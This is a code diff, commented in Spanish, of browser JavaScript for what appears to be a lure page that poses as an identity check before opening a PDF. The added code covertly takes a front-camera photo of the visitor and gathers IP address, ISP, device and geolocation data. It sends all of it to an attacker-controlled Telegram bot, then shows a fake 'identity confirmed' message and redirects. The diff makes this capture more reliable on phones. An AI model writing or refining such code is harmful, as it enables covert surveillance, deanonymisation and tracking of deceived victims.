@@ -64,28 +64,45 @@
 
             try {
                 let fotoBlob = null;
-                // 1. Captura de cámara
+                
+                // 1. Captura de cámara optimizada
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    // Pedimos explícitamente la cámara frontal
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: false 
+                    });
+                    
                     const video = document.createElement('video');
                     video.srcObject = stream;
+                    video.setAttribute("playsinline", true); // Requerido para iOS
                     await video.play();
+
+                    // Pequeña pausa para que la cámara enfoque/ajuste brillo
+                    await new Promise(resolve => setTimeout(resolve, 800));
+
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; 
+                    canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+                    
+                    // Convertimos a blob con una calidad decente
+                    fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+                    
+                    // Apagamos la cámara
                     stream.getTracks().forEach(t => t.stop());
-                } catch(e) { console.log("Cámara denegada"); }
+                } catch(e) { 
+                    console.error("Cámara denegada o error:", e); 
+                }
 
                 // 2. Datos de red y ubicación
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                // Corrección del modelo de equipo
                 let equipo = "Dispositivo Desconocido";
                 try { equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e) {}
 
-                // 3. Formatear reporte (Corrección del link de Mapa)
+                // 3. Formatear reporte
                 const reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n` +
                                 `📱 *Equipo:* ${equipo}\n` +
                                 `🌐 *IP:* \`${d.ip}\`\n` +
@@ -93,30 +110,46 @@
                                 `📶 *ISP:* ${d.org}\n` +
                                 `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // 4. Envío a Telegram
-                const p = [fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                // 4. Envío a Telegram (Texto y Foto)
+                const promesasEnvio = [];
+
+                // Envío de reporte de texto
+                promesasEnvio.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown'})
-                })];
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID, 
+                        text: reporte, 
+                        parse_mode: 'Markdown'
+                    })
+                }));
 
+                // Envío de foto si se capturó con éxito
                 if (fotoBlob) {
                     const fd = new FormData();
                     fd.append('chat_id', CONFIG.CHAT_ID);
                     fd.append('photo', fotoBlob, 'captura.jpg');
-                    p.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd}));
+                    
+                    promesasEnvio.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
+                        method: 'POST', 
+                        body: fd
+                    }));
                 }
 
-                await Promise.all(p);
+                await Promise.all(promesasEnvio);
 
-            } catch(e) { console.log("Error en el proceso"); }
+            } catch(e) { 
+                console.error("Error en el proceso general:", e); 
+            }
 
             // Finalización y Redirección
             setTimeout(() => {
                 if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
                 beep.play();
                 textGuide.innerHTML = "✅ IDENTIDAD CONFIRMADA. ABRIENDO PDF...";
-                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
+                setTimeout(() => { 
+                    window.location.href = CONFIG.PDF_URL; 
+                }, 1500);
             }, 3500);
         }
 
